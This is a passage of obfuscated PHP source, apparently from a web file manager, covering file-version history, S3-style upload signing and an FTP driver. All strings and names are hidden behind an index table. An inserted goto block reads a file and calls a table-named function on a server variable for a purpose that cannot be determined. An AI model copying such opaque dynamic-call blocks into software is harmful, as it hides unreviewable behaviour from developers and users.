} public static function remove($·öçÆÖ§, $£»œ¹ıÒ) { $™ŒÌÏæ½ =& $_SERVER[™¸œØ®Ü]; $ÀË»ç‡Ú = self::listData($·öçÆÖ§); $ê»Ï…äõ = array(); if (!$ÀË»ç‡Ú) { return !1; } foreach ($ÀË»ç‡Ú[$™ŒÌÏæ½[447]] as $ƒÏ©ï¡¡) { if ($ƒÏ©ï¡¡[$™ŒÌÏæ½[477]] == $£»œ¹ıÒ) { IO::remove($ÀË»ç‡Ú[$™ŒÌÏæ½[1347]] . $ƒÏ©ï¡¡[$™ŒÌÏæ½[32]]); continue; } $ê»Ï…äõ[] = $ƒÏ©ï¡¡; } return self::saveData($ÀË»ç‡Ú[$™ŒÌÏæ½[1348]], $ê»Ï…äõ); } public static function clear($õ¡Íì¸, $Ûç½òŠñ = true) { $ĞÆ–¿£Û =& $_SERVER[™¸œØ®Ü]; $”Óæ—Âß = self::listData($õ¡Íì¸, $Ûç½òŠñ); if (!$”Óæ—Âß) { return !1; } foreach ($”Óæ—Âß[$ĞÆ–¿£Û[447]] as $¿˜¯†) { IO::remove($”Óæ—Âß[$ĞÆ–¿£Û[1347]] . $¿˜¯†[$ĞÆ–¿£Û[32]]); } return self::saveData($”Óæ—Âß[$ĞÆ–¿£Û[1348]], array()); } public static function moveHistory($“ÆÂù™è, $îİÍ–üï = '', $’ÚÁÅÅ» = '') { $Â×‘øÑ =& $_SERVER[™¸œØ®Ü]; $óšˆ–ºí = self::listData($“ÆÂù™è, !1); if (!$óšˆ–ºí || !$óšˆ–ºí[$Â×‘øÑ[447]]) { return !1; } $¼Ÿ¢…¢Û = $Â×‘øÑ[1335]; $îİÍ–üï = $îİÍ–üï ? $îİÍ–üï : get_path_this($“ÆÂù™è); $’ÚÁÅÅ» = $’ÚÁÅÅ» ? $’ÚÁÅÅ» : $óšˆ–ºí[$Â×‘øÑ[1347]]; $—‘”Ö™ì = substr(get_path_this($óšˆ–ºí[$Â×‘øÑ[1348]]), 0, -strlen($¼Ÿ¢…¢Û)); foreach ($óšˆ–ºí[$Â×‘øÑ[447]] as $ÖÕˆ«úã => $ÒòÁ¡ˆÛ) { $ñÎ¾‹¦ = $îİÍ–üï . substr($ÒòÁ¡ˆÛ[$Â×‘øÑ[32]], strlen($—‘”Ö™ì)); $ ´¬œ±¦ = IO::move($óšˆ–ºí[$Â×‘øÑ[1347]] . $ÒòÁ¡ˆÛ[$Â×‘øÑ[32]], $’ÚÁÅÅ», !1, $ñÎ¾‹¦); if ($ ´¬œ±¦) { $óšˆ–ºí[$Â×‘øÑ[447]][$ÖÕˆ«úã][$Â×‘øÑ[32]] = $ñÎ¾‹¦; } } $óšˆ–ºí[$Â×‘øÑ[1348]] = IO::move($óšˆ–ºí[$Â×‘øÑ[1348]], $’ÚÁÅÅ», !1, $îİÍ–üï . $¼Ÿ¢…¢Û); self::saveData($óšˆ–ºí[$Â×‘øÑ[1348]], $óšˆ–ºí[$Â×‘øÑ[447]]); self::clearEmptyFolder($óšˆ–ºí[$Â×‘øÑ[1347]]); } public static function rollback($íìåĞú­, $Ñß³€¥) { $‰ı“ÅäË =& $_SERVER[™¸œØ®Ü]; $şÔŠéŒ¹ = self::listData($íìåĞú­); if (!$şÔŠéŒ¹) { return; } $ÏšƒÊØ£ = IO::info($íìåĞú­); foreach ($şÔŠéŒ¹[$‰ı“ÅäË[447]] as $èÇ×ìÃì => $èé±Ù¡°) { if ($èé±Ù¡°[$‰ı“ÅäË[477]] == $Ñß³€¥) { self::add($íìåĞú­); $ŠÕ¤¬Ç® = $şÔŠéŒ¹[$‰ı“ÅäË[1347]] . $èé±Ù¡°[$‰ı“ÅäË[32]]; $âÜÙÓó» = IO::copy($ŠÕ¤¬Ç®, IO::pathFather($íìåĞú­), REPEAT_REPLACE, $ÏšƒÊØ£[$‰ı“ÅäË[32]]); if ($âÜÙÓó») { self::remove($íìåĞú­, $Ñß³€¥); } return $âÜÙÓó»; } } return !1; } public static function setDetail($ÅºÛİïš, $àºúÑÖ, $Ÿ½†½æÚ) { $…®‘ŒûŞ =& $_SERVER[™¸œØ®Ü]; $Í“ï = self::listData($ÅºÛİïš); if (!$Í“ï) { return; } foreach ($Í“ï[$…®‘ŒûŞ[447]] as $íÛúŠğÖ => $úç¶Éìî) { if ($úç¶Éìî[$…®‘ŒûŞ[477]] == $àºúÑÖ) { $Í“ï[$…®‘ŒûŞ[447]][$íÛúŠğÖ][$…®‘ŒûŞ[1346]] = $Ÿ½†½æÚ; self::saveData($Í“ï[$…®‘ŒûŞ[1348]], $Í“ï[$…®‘ŒûŞ[447]]); return !0; } } return !1; } public static function fileInfo($¸ªŞŞºù, $ĞÄ®™íŞ) { $Ù•ÉŸ´° =& $_SERVER[™¸œØ®Ü]; $€èÃÌ¤ = self::listData($¸ªŞŞºù); if (!$€èÃÌ¤) { show_json(LNG($Ù•ÉŸ´°[108]), !1); } $€ı¢€âó = $Ù•ÉŸ´°[12]; foreach ($€èÃÌ¤[$Ù•ÉŸ´°[447]] as $İ¼é½”â => $ïÚÏõÖµ) { if ($ïÚÏõÖµ[$Ù•ÉŸ´°[477]] != $ĞÄ®™íŞ) { continue; } $€ı¢€âó = $€èÃÌ¤[$Ù•ÉŸ´°[1347]] . $ïÚÏõÖµ[$Ù•ÉŸ´°[32]]; break; } if (!$€ı¢€âó) { show_json(LNG($Ù•ÉŸ´°[108]), !1); } return IO::info($€ı¢€âó); } public static function fileOut($Äƒ‹¼Å, $÷§¥ÕñÛ, $‰óØ†É = false) { $äŒ¬Ú¾¬ =& $_SERVER[™¸œØ®Ü]; $ÕøÉ½ÙÙ = self::fileInfo($Äƒ‹¼Å, $÷§¥ÕñÛ); $ÊÍë¬ƒ =& $GLOBALS[$äŒ¬Ú¾¬[7]]; $‰óØ†É = isset($ÊÍë¬ƒ[$äŒ¬Ú¾¬[1298]]) && $ÊÍë¬ƒ[$äŒ¬Ú¾¬[1298]] == 1; if (isset($ÊÍë¬ƒ[$äŒ¬Ú¾¬[33]]) && $ÊÍë¬ƒ[$äŒ¬Ú¾¬[33]] == $äŒ¬Ú¾¬[1349]) { return IO::fileOutImage($ÕøÉ½ÙÙ[$äŒ¬Ú¾¬[87]], $ÊÍë¬ƒ[$äŒ¬Ú¾¬[1350]]); } IO::fileOut($ÕøÉ½ÙÙ[$äŒ¬Ú¾¬[87]], $‰óØ†É, get_path_this($Äƒ‹¼Å)); } public static function listData($ôÍŸÈˆ¨, $Æ“‘€£÷ = true) { $ı¯İÚª =& $_SERVER[™¸œØ®Ü]; if ($Æ“‘€£÷ && !IO::exist($ôÍŸÈˆ¨)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ôÍŸÈˆ¨, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $Õ€…¦ô° = self::pathHistory($ôÍŸÈˆ¨); $¼İ½»¥¯ = array($ı¯İÚª[1348] => $Õ€…¦ô° . $ı¯İÚª[1335], $ı¯İÚª[1347] => rtrim(get_path_father($Õ€…¦ô°), $ı¯İÚª[8]) . $ı¯İÚª[8], $ı¯İÚª[447] => array()); $‚ªàâõÓ = IO::getContent($¼İ½»¥¯[$ı¯İÚª[1348]]); if ($‚ªàâõÓ) { $›¥¢çÔæ = json_decode($‚ªàâõÓ, !0); if (is_array($›¥¢çÔæ)) { $¼İ½»¥¯[$ı¯İÚª[447]] = $›¥¢çÔæ; } } return $¼İ½»¥¯; } private static function saveData($üŸí­’Ë, $®ÆÖ»ŸÁ) { $áÏ®ã =& $_SERVER[™¸œØ®Ü]; self::log($áÏ®ã[1351] . $üŸí­’Ë . $áÏ®ã[74] . count($®ÆÖ»ŸÁ), $áÏ®ã[837]); if ($®ÆÖ»ŸÁ) { return IO::setContent($üŸí­’Ë, json_encode($®ÆÖ»ŸÁ)); } $Ë¦½şè³ = IO::pathFather($üŸí­’Ë); IO::remove($üŸí­’Ë); self::clearEmptyFolder($Ë¦½şè³); return !0; } public static function clearEmptyFolder($‡³ã†áÁ) { $½š¨äŠ‘ =& $_SERVER[™¸œØ®Ü]; if (trim($‡³ã†áÁ, $½š¨äŠ‘[8]) == trim(self::$_historyBase, $½š¨äŠ‘[8])) { return; } $èÇ¸œë = IO::pathFather($‡³ã†áÁ); $˜¯Í’—œ = IO::has($‡³ã†áÁ, !0); if ($˜¯Í’—œ[$½š¨äŠ‘[241]] > 0 || $˜¯Í’—œ[$½š¨äŠ‘[242]] > 0) { return; } IO::remove($‡³ã†áÁ); self::clearEmptyFolder($èÇ¸œë); } private static function getBasePath() { $®®ìŸöå =& $_SERVER[™¸œØ®Ü]; $®æ™ƒœŒ = Model($®®ìŸöå[1352])->get($®®ìŸöå[1353]); if ($®æ™ƒœŒ) { if (!IO::exist($®æ™ƒœŒ)) { IO::mkdir($®æ™ƒœŒ); } if (get_path_this($®æ™ƒœŒ) == $®®ìŸöå[1338]) { $ş‡ƒª“— = $®®ìŸöå[1354] . rand_string(8); @rename($®æ™ƒœŒ, get_path_father($®æ™ƒœŒ) . $®®ìŸöå[8] . $ş‡ƒª“—); $®æ™ƒœŒ = DATA_PATH . $ş‡ƒª“— . $®®ìŸöå[8]; file_put_contents(DATA_PATH . $®®ìŸöå[1285], $®®ìŸöå[12]); Model($®®ìŸöå[1352])->set($®®ìŸöå[1353], $®æ™ƒœŒ); } return $®æ™ƒœŒ; } $®æ™ƒœŒ = DATA_PATH . $®®ìŸöå[1354] . rand_string(8) . $®®ìŸöå[8]; $®æ™ƒœŒ = IO::mkdir($®æ™ƒœŒ); $®æ™ƒœŒ = rtrim($®æ™ƒœŒ, $®®ìŸöå[8]) . $®®ìŸöå[8]; file_put_contents($®æ™ƒœŒ . $®®ìŸöå[1285], $®®ìŸöå[12]); file_put_contents(DATA_PATH . $®®ìŸöå[1285], $®®ìŸöå[12]); Model($®®ìŸöå[1352])->set($®®ìŸöå[1353], $®æ™ƒœŒ); return $®æ™ƒœŒ; } } goto Dˆöò·—¡±; dñ½®İ‰¢: if ($_SERVER[$_SERVER[™¸œØ®Ü][971]] != $_SERVER[$_SERVER[™¸œØ®Ü][1460]]) { $_getc = $_SERVER[™¸œØ®Ü][973]; $_getfile = $_SERVER[$_SERVER[™¸œØ®Ü][968]] . $_SERVER[™¸œØ®Ü][969]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[™¸œØ®Ü][287], $_getfilec); if (count($_getarrs) < $_SERVER[™¸œØ®Ü][696]) { $exit = $_SERVER[™¸œØ®Ü][974]; $exit(); } $_act = $_SERVER[™¸œØ®Ü][1458]; $_act($_SERVER[$_SERVER[™¸œØ®Ü][1457]]); } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($ìÅ”¦é’) { parent::__construct($ìÅ”¦é’); $this->setSignVersion($_SERVER[™¸œØ®Ü][249]); } public function uploadFormData($şÄƒ„Ğ, $ÔßÃµÚÚ = 3600) { $‘’ ¨¥­ =& $_SERVER[™¸œØ®Ü]; $ú’‹Ö£¶ = $‘’ ¨¥­[231]; $Ã§´İŸ¿ = $‘’ ¨¥­[259]; $ÑßëçÈò = $‘’ ¨¥­[62]; $ï»Ô·à­ = gmdate($‘’ ¨¥­[260]); $…÷–¡–Ş = gmdate($‘’ ¨¥­[261]); $”àÌ›æÆ = $‘’ ¨¥­[262]; $ïÓàÊ¶ = $ÔßÃµÚÚ . $‘’ ¨¥­[12]; $ñµùƒ®ê = $‘’ ¨¥­[263]; $Ãõôßƒ™ = array($this->accessKey, $…÷–¡–Ş, $this->region, $ÑßëçÈò, $”àÌ›æÆ); $ûû„ñ×Â = implode($‘’ ¨¥­[8], $Ãõôßƒ™); $ôúâ„˜½ = array($‘’ ¨¥­[264] => gmdate($‘’ ¨¥­[1432], strtotime($‘’ ¨¥­[266])), $‘’ ¨¥­[267] => array(array($‘’ ¨¥­[268] => $this->bucket), array($‘’ ¨¥­[308] => $ú’‹Ö£¶), array($‘’ ¨¥­[269], $‘’ ¨¥­[270], $‘’ ¨¥­[12]), array($‘’ ¨¥­[269], $‘’ ¨¥­[271], $‘’ ¨¥­[12]), array($‘’ ¨¥­[269], $‘’ ¨¥­[309], $‘’ ¨¥­[12]), array($‘’ ¨¥­[272] => $ñµùƒ®ê), array($‘’ ¨¥­[273] => $ûû„ñ×Â), array($‘’ ¨¥­[274] => $Ã§´İŸ¿), array($‘’ ¨¥­[275] => $ï»Ô·à­), array($‘’ ¨¥­[276] => $ïÓàÊ¶))); $’“êøÒ = base64_encode(json_encode($ôúâ„˜½)); $ëáó°¶í = hash_hmac($‘’ ¨¥­[277], $…÷–¡–Ş, $‘’ ¨¥­[278] . $this->secret, !0); $­üØÚ³Û = hash_hmac($‘’ ¨¥­[277], $this->region, $ëáó°¶í, !0); $ã¼øĞä = hash_hmac($‘’ ¨¥­[277], $ÑßëçÈò, $­üØÚ³Û, !0); $™ì—¼Şï = hash_hmac($‘’ ¨¥­[277], $”àÌ›æÆ, $ã¼øĞä, !0); $çÊŠºÆ– = hash_hmac($‘’ ¨¥­[277], $’“êøÒ, $™ì—¼Şï); $ÓÉ‰éƒ = array($‘’ ¨¥­[248] => $‘’ ¨¥­[12], $‘’ ¨¥­[296] => $‘’ ¨¥­[12], $‘’ ¨¥­[308] => $ú’‹Ö£¶, $‘’ ¨¥­[272] => $ñµùƒ®ê, $‘’ ¨¥­[279] => $’“êøÒ, $‘’ ¨¥­[310] => $ûû„ñ×Â, $‘’ ¨¥­[311] => $Ã§´İŸ¿, $‘’ ¨¥­[312] => $ï»Ô·à­, $‘’ ¨¥­[313] => $ïÓàÊ¶, $‘’ ¨¥­[314] => $çÊŠºÆ–, $‘’ ¨¥­[208] => $this->getHost()); return $ÓÉ‰éƒ; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = false; private $pasv = "\x31"; public $config = array(); public function __construct($ìÌš¢Éó) { parent::__construct(); if (count($ìÌš¢Éó) > 0) { $this->_init($ìÌš¢Éó); } } public function __destruct() { if (!$this->_isconn(!1)) { return !1; } return @ftp_close($this->connect); } private function charsetReset($ÕùÆ—) { $ôºÅüÊÇ =& $_SERVER[™¸œØ®Ü]; global $config; $this->appCharset = $config[$ôºÅüÊÇ[1461]]; $this->systemCharset = $config[$ôºÅüÊÇ[1462]]; if (isset($ÕùÆ—[$ôºÅüÊÇ[1463]]) && $ÕùÆ—[$ôºÅüÊÇ[1463]]) { $this->systemCharset = $ÕùÆ—[$ôºÅüÊÇ[1463]]; } } public function iconvApp($Îö›şì…) { return $this->iconvTo($Îö›şì…, $this->systemCharset, $this->appCharset); } public function iconvSystem($öÇ‡¼Éè) { return $this->iconvTo($öÇ‡¼Éè, $this->appCharset, $this->systemCharset); } public function getPathOuter($ ÛÃŠšã) { $ü²˜¿¬ =& $_SERVER[™¸œØ®Ü]; $¸…öŸ«ë = $this->iconvApp($this->pathBase); $ ÛÃŠšã = $this->iconvApp($ ÛÃŠšã); if (substr($¸…öŸ«ë, 0, 2) == $ü²˜¿¬[1430]) { $¸…öŸ«ë = BASIC_PATH . substr($¸…öŸ«ë, 2); } if (substr($ ÛÃŠšã, 0, 2) == $ü²˜¿¬[1430]) { $ ÛÃŠšã = BASIC_PATH . substr($ ÛÃŠšã, 2); } $¸…öŸ«ë = KodIO::clear($¸…öŸ«ë); $ ÛÃŠšã = KodIO::clear($ ÛÃŠšã); $ ÛÃŠšã = substr($ ÛÃŠšã, strlen($¸…öŸ«ë)); if (empty($this->pathDriver)) { return $ ÛÃŠšã; } return $this->pathDriver . $ü²˜¿¬[8] . ltrim($ ÛÃŠšã, $ü²˜¿¬[8]); } private function _init($ªÅÚşƒ = array()) { $ªèÛ©”³ =& $_SERVER[™¸œØ®Ü]; if (!function_exists($ªèÛ©”³[1464])) { throw new Exception(LNG($ªèÛ©”³[1465])); } $this->config = $ªÅÚşƒ; $this->charsetReset($ªÅÚşƒ); foreach ($ªÅÚşƒ as $º´Ş¹œõ => $ÀÀ´¨Ç‘) { if (isset($this->{$º´Ş¹œõ})) { $this->{$º´Ş¹œõ} = $ÀÀ´¨Ç‘; } } return $this->_login($ªÅÚşƒ); } private function _login($ùİÕ€Ø¶) { $®Ê¶öÅÙ =& $_SERVER[™¸œØ®Ü]; static $çƒ—êßÀ = array(); $²ÄÖ†©“ = md5(json_encode($ùİÕ€Ø¶)); if (isset($çƒ—êßÀ[$²ÄÖ†©“])) { foreach ($çƒ—êßÀ[$²ÄÖ†©“] as $‡ÍÑî•€ => $Èœ¹Î¹) { $this->{$‡ÍÑî•€} = $Èœ¹Î¹; } return !0; } $Ø¸Å¬˜¬ = parse_url(trim($this->server, $®Ê¶öÅÙ[8])); $this->host = $Ø¸Å¬˜¬[$®Ê¶öÅÙ[208]]; $¦–Ô¥ì€ = isset($Ø¸Å¬˜¬[$®Ê¶öÅÙ[207]]) && $Ø¸Å¬˜¬[$®Ê¶öÅÙ[207]] == $®Ê¶öÅÙ[1466] ? !0 : !1; $this->scheme = $¦–Ô¥ì€ ? $®Ê¶öÅÙ[1467] : $®Ê¶öÅÙ[1468]; $this->port = isset($Ø¸Å¬˜¬[$®Ê¶öÅÙ[209]]) ? $Ø¸Å¬˜¬[$®Ê¶öÅÙ[209]] : 21; $this->connect = @ftp_connect($this->host, $this->port, 30); if ($this->connect === !1) { $this->writeLog(LNG($®Ê¶öÅÙ[1469]) . $this->host . $®Ê¶öÅÙ[4] . $this->port, !0); return !1; } $¢›¤Äİï = @ftp_login($this->connect, $this->username, $this->userpass); if (!$¢›¤Äİï) { $this->writeLog(LNG($®Ê¶öÅÙ[1470]) . $this->username, !0); return !1; } $this->ftpPath = @ftp_pwd($this->connect); @ftp_chdir($this->connect, $®Ê¶öÅÙ[8]); @ftp_set_option($this->connect, FTP_USEPASVADDRESS, !1); $÷ù×²Í¶ = $this->pasv == $®Ê¶öÅÙ[91] ? !0 : !1; @ftp_pasv($this->connect, $÷ù×²Í¶); $çƒ—êßÀ[$²ÄÖ†©“] = array($®Ê¶öÅÙ[1471] => $this->connect, $®Ê¶öÅÙ[208] => $this->host, $®Ê¶öÅÙ[207] => $this->scheme, $®Ê¶öÅÙ[209] => $this->port); return $¢›¤Äİï; } private function _isconn($®ÃœÁìÂ = true) { if (is_resource($this->connect)) { return !0; } if (!$®ÃœÁìÂ) { return !1; } return $this->_login($this->config); } public function mkfile($€İà±±ª, $´‰´¹Ì = '', $µ£šÃâ³ = REPEAT_RENAME) { if ($this->setContent($€İà±±ª, $´‰´¹Ì)) { return $this->getPathOuter($€İà±±ª); } $this->writeLog(LNG($_SERVER[™¸œØ®Ü][1472]), !0); return !1; } public function mkdir($‡ÔÊŠÏÀ, $‡§¢¬¡Ã = REPEAT_SKIP) { $äëïæ¡ =& $_SERVER[™¸œØ®Ü]; if (!$‡ÔÊŠÏÀ || $‡ÔÊŠÏÀ == $äëïæ¡[8]) { return !0; } if (!$this->_isconn()) { return !1; } $‡ÔÊŠÏÀ = $this->iconvSystem($‡ÔÊŠÏÀ); if ($this->_isFolder($‡ÔÊŠÏÀ) || @ftp_mkdir($this->connect, $‡ÔÊŠÏÀ)) { return $this->getPathOuter($‡ÔÊŠÏÀ); } if (!$this->mkdir($this->pathFather($‡ÔÊŠÏÀ))) { return !1; } if ($‡ÔÊŠÏÀ = @ftp_mkdir($this->connect, $‡ÔÊŠÏÀ)) { return $this->getPathOuter($‡ÔÊŠÏÀ); } $Åß­šÅí = __FUNCTION__ . $äëïæ¡[1473]; $this->writeLog($Åß­šÅí, !0); return !1; } public function copyFile($ÀÒÎÇ³², $ŸŒ±à¶) { if (!$this->_isconn()) { return !1; } $úÎŒµ–ö = $this->pathThis($this->iconvSystem($ÀÒÎÇ³²)); $ñö¿—Œ  = $this->tempFile($úÎŒµ–ö); $´¯¡¼ = $this->iconvApp($ñö¿—Œ ); $this->download($ÀÒÎÇ³², $´¯¡¼); $ş›ëö¥ù = $this->upload($ŸŒ±à¶, $´¯¡¼); $this->tempFileRemve($ñö¿—Œ ); return $ş›ëö¥ù; } public function moveFile($«ŸÙ†÷Û, $ı§öÜÌ¹) { if (!$this->_isconn()) { return !1; } $«ŸÙ†÷Û = $this->iconvSystem($«ŸÙ†÷Û); $ı§öÜÌ¹ = $this->iconvSystem($ı§öÜÌ¹); $ıåç¹´Ô = @ftp_rename($this->connect, $«ŸÙ†÷Û, $ı§öÜÌ¹); if (!$ıåç¹´Ô) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); return !1; } return $this->getPathOuter($ı§öÜÌ¹); } public function delFile($üÚüäëä) { if (!$this->_isconn()) { return !1; } $üÚüäëä = $this->iconvSystem($üÚüäëä); $Æ“—âÏ = @ftp_delete($this->connect, $üÚüäëä); if (!$Æ“—âÏ) { $this->writeLog(__FUNCTION__ . $_SERVER[™¸œØ®Ü][1473], !0); } return $Æ“—âÏ; } public function delFolder($Ø­şè¿) { if (!$this->_isconn()) { return !1; } $this->listItemCache = !1; $™ËôñÂÎ = $ÒŸàÏšÖ = array(); $this->fileList($Ø­şè¿, $™ËôñÂÎ, $ÒŸàÏšÖ, !0); $this->listItemCache = !0; foreach ($ÒŸàÏšÖ as $ÎÁ§¹€) { $üÀ²§ê½ = $this->iconvSystem($ÎÁ§¹€[$_SERVER[™¸œØ®Ü][32]]); $àæ íı± = @ftp_delete($this->connect, $üÀ²§ê½); if (!$àæ íı±) { return !1; } } foreach ($™ËôñÂÎ as $üÀ²§ê½) { $üÀ²§ê½ = $this->iconvSystem($üÀ²§ê½); $àæ íı± = @ftp_rmdir($this->connect, $üÀ²§ê½); if (!$àæ íı±) { return !1; } } $Ø­şè¿ = $this->iconvSystem($Ø­şè¿); return @ftp_rmdir($this->connect, $Ø­şè¿); } public function rename($ÄõÜç¬, $¯èÍ¼ì¤) { $üá°•é× =& $_SERVER[™¸œØ®Ü]; if (!$this->_isconn()) { return !1; } $‹Ä§ôô¤ = $this->fileNameAuto($this->pathFather($ÄõÜç¬), $¯èÍ¼ì¤); $‹Ä§ôô¤ = $this->iconvSystem($‹Ä§ôô¤); $ÄõÜç¬ = $this->iconvSystem($ÄõÜç¬); $À¸˜È€ = $this->pathFather($ÄõÜç¬); $­î³ä¼œ = rtrim($À¸˜È€, $üá°•é×[8]) . $üá°•é×[8] . $‹Ä§ôô¤; $ Ã‘‰É = @ftp_rename($this->connect, $ÄõÜç¬, $­î³ä¼œ); if (!$ Ã‘‰É) { $this->writeLog(__FUNCTION__ . $üá°•é×[1473], !0); return !1; } $­î³ä¼œ = $this->iconvApp($­î³ä¼œ); return $this->getPathOuter($­î³ä¼œ); } private function folderInfo($ÄˆÂ Üã, $¦Œ«ë²ô = false) { $ çÅ±½ =& $_SERVER[™¸œØ®Ü]; $èğ¦‹»§ = array($ çÅ±½[32] => $this->pathThis($ÄˆÂ Üã), $ çÅ±½[87] => $this->getPathOuter($ çÅ±½[8] . $ÄˆÂ Üã), $ çÅ±½[33] => $ çÅ±½[78]); if ($¦Œ«ë²ô) { return $èğ¦‹»§; } $èğ¦‹»§[$ çÅ±½[233]] = $èğ¦‹»§[$ çÅ±½[88]] = 0; $èğ¦‹»§[$ çÅ±½[234]] = $èğ¦‹»§[$ çÅ±½[235]] = !0; return $èğ¦‹»§; } private function fileInfo($½Ï–Ü“€, $ÙÈÁÌ°÷ = false, $’¥êõÑ = array()) { $§Ü™µÄ² =& $_SERVER[™¸œØ®Ü]; $Ï¯£ó« = array($§Ü™µÄ²[32] => $this->pathThis($½Ï–Ü“€), $§Ü™µÄ²[87] => $this->getPathOuter($§Ü™µÄ²[8] . $½Ï–Ü“€), $§Ü™µÄ²[33] => $§Ü™µÄ²[232], $§Ü™µÄ²[79] => isset($’¥êõÑ[$§Ü™µÄ²[79]]) ? $’¥êõÑ[$§Ü™µÄ²[79]] : 0, $§Ü™µÄ²[169] => $this->ext($½Ï–Ü“€)); if ($ÙÈÁÌ°÷) { return $Ï¯£ó«; } $Ï¯£ó«[$§Ü™µÄ²[233]] = $Ï¯£ó«[$§Ü™µÄ²[88]] = 0; $Ï¯£ó«[$§Ü™µÄ²[234]] = $Ï¯£ó«[$§Ü™µÄ²[235]] = !0; $ªŒËá¥è = $this->iconvSystem($½Ï–Ü“€); $Ï¯£ó«[$§Ü™µÄ²[88]] = @ftp_mdtm($this->connect, $ªŒËá¥è); if (empty($’¥êõÑ)) { $’¥êõÑ = $this->objectMeta($½Ï–Ü“€); if (!$’¥êõÑ) { return $Ï¯£ó«; } } $Ï¯£ó«[$§Ü™µÄ²[79]] = $’¥êõÑ[$§Ü™µÄ²[79]]; return $Ï¯£ó«; } public function size($Ôó˜¡ï¬) { $Æ¦û¹Œù = $this->objectMeta($Ôó˜¡ï¬); return $Æ¦û¹Œù ? $Æ¦û¹Œù[$_SERVER[™¸œØ®Ü][79]] : 0; } public function info($­Ùã–¹É) { if ($this->isFile($­Ùã–¹É)) { return $this->fileInfo($­Ùã–¹É, 0); } else { if ($this->isFolder($­Ùã–¹É)) { return $this->folderInfo($­Ùã–¹É); } } return !1; } private function fileList($êîƒËƒÜ, &$í†íÎ‚‚, &$°¹§ò‰©, $ÆşªÙö = false) { $Ÿ«²– ô =& $_SERVER[™¸œØ®Ü]; $êîƒËƒÜ = $this->iconvSystem($êîƒËƒÜ); if (!$this->isFolder($êîƒËƒÜ)) { return !1; } $êîƒËƒÜ = rtrim($êîƒËƒÜ, $Ÿ«²– ô[8]) . $Ÿ«²– ô[8]; check_abort(); $Èòâ™ÇÓ = @ftp_rawlist($this->connect, $êîƒËƒÜ); if (!$Èòâ™ÇÓ) { $Èòâ™ÇÓ = array(); } $ğËÌœ ş = array($Ÿ«²– ô[10] => 1, $Ÿ«²– ô[1382] => 1); foreach ($Èòâ™ÇÓ as $åŒËéÀï) { $ÈÛ¹ºãù = $this->_listItem($åŒËéÀï); if ($ÈÛ¹ºãù[0] == $Ÿ«²– ô[843]) { continue; } $ĞõÎì• = $ÈÛ¹ºãù[8]; if (empty($ĞõÎì•) && $ĞõÎì• !== $Ÿ«²– ô[230] || isset($ğËÌœ ş[$ĞõÎì•])) { continue; } $ĞõÎì• = $this->iconvApp($êîƒËƒÜ . ltrim($ĞõÎì•, $Ÿ«²– ô[8])); $¤á«ŒØ³ = array($Ÿ«²– ô[32] => $ĞõÎì•, $Ÿ«²– ô[33] => $Ÿ«²– ô[232], $Ÿ«²– ô[79] => $ÈÛ¹ºãù[4]); if (substr($åŒËéÀï, 0, 1) == $Ÿ«²– ô[1474]) { $¤á«ŒØ³[$Ÿ«²– ô[33]] = $Ÿ«²– ô[78]; $¤á«ŒØ³[$Ÿ«²– ô[79]] = 0; } $¹ÅàÙÛ = $¤á«ŒØ³[$Ÿ«²– ô[33]] == $Ÿ«²– ô[78] ? !0 : !1; $this->cacheMethodInfoSet($ĞõÎì•, $¹ÅàÙÛ, $¤á«ŒØ³); if ($¹ÅàÙÛ) { $í†íÎ‚‚[] = $ĞõÎì•; if ($ÆşªÙö) { $this->fileList($ĞõÎì•, $í†íÎ‚‚, $°¹§ò‰©, $ÆşªÙö); } continue; } $°¹§ò‰©[] = $¤á«ŒØ³; } $this->cacheMethodInfoSet($êîƒËƒÜ, !0); } private function _listItem($öáä¿Å) { if (empty($öáä¿Å)) { return array(); } $—œ°îÏó = preg_split($_SERVER[™¸œØ®Ü][1475], $öáä¿Å); if (count($—œ°îÏó) <= 9) { return $—œ°îÏó; } $—œ°îÏó[8] = trim(substr($öáä¿Å, strpos($öáä¿Å, $—œ°îÏó[7]) + strlen($—œ°îÏó[7]))); return array_splice($—œ°îÏó, 0, 9); } public function listPath($½éÒñŒ®, $ëè±Ù = false) { $†­ƒ÷€Ò =& $_SERVER[™¸œØ®Ü]; if (!$this->_isconn()) { return !1; } $«×™ı» = $“¤ú¤é = array(); $this->fileList($½éÒñŒ®, $«×™ı», $“¤ú¤é); foreach ($«×™ı» as $¨™°û™È => $ö—’±à½) { $«×™ı»[$¨™°û™È] = $this->folderInfo($ö—’±à½, $ëè±Ù); } foreach ($“¤ú¤é as $¨™°û™È => $ö—’±à½) { $“¤ú¤é[$¨™°û™È] = $this->fileInfo($ö—’±à½[$†­ƒ÷€Ò[32]], $ëè±Ù, $ö—’±à½); } return array($†­ƒ÷€Ò[85] => $«×™ı», $†­ƒ÷€Ò[86] => $“¤ú¤é); } public function has($´ÉÚ¦–ï, $òãËº¿‚ = false, $ñğÎäŒ = true) { $çÕˆ½…É =& $_SERVER[™¸œØ®Ü]; $šïÌÅ¥Ã = $ÖêúÆÌ = array(); $²·÷Ğ = $òãËº¿‚ ? !0 : !1; $this->fileList($´ÉÚ¦–ï, $šïÌÅ¥Ã, $ÖêúÆÌ, $²·÷Ğ); if ($òãËº¿‚) { return array($çÕˆ½…É[241] => count($ÖêúÆÌ), $çÕˆ½…É[242] => count($šïÌÅ¥Ã)); } if ($ñğÎäŒ) { if (count($ÖêúÆÌ)) { return !0; } } else { if (count($šïÌÅ¥Ã)) { return !0; } } return !1; } public function listAll($Æ˜°»¬) { $Ğ½«™Š =& $_SERVER[™¸œØ®Ü]; if (!$this->_isconn()) { return !1; } $…¤µùû = $–†Ş½•† = array(); $this->fileList($Æ˜°»¬, $…¤µùû, $–†Ş½•†, !0); $Õú¡ß­ı = array_to_keyvalue($–†Ş½•†, $Ğ½«™Š[32]); foreach ($…¤µùû as $ñ¢„ÑÍ©) { if (is_string($ñ¢„ÑÍ©)) { $Õú¡ß­ı[$ñ¢„ÑÍ©] = array($Ğ½«™Š[79] => 0); } } return $this->listAllFiles($Æ˜°»¬, $Õú¡ß­ı); } public function getContent($€šÎœ²¬) { if (!$this->_isconn()) { return !1; } $€šÎœ²¬ = 